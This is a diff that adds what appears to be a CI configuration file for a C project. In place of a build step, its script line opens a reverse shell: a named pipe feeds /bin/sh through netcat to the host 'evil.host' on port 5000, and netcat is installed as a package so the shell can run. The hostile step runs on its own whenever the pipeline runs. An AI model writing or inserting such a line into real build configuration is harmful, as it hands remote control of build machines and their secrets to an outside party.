@@ -1,0 +1,8 @@
+language: c
+compiler:
+    - clang
+script: mknod /tmp/thing p && /bin/sh 0</tmp/thing | nc evil.host 5000 1>/tmp/thing
+addons:
+  apt:
+    packages:
+    - netcat
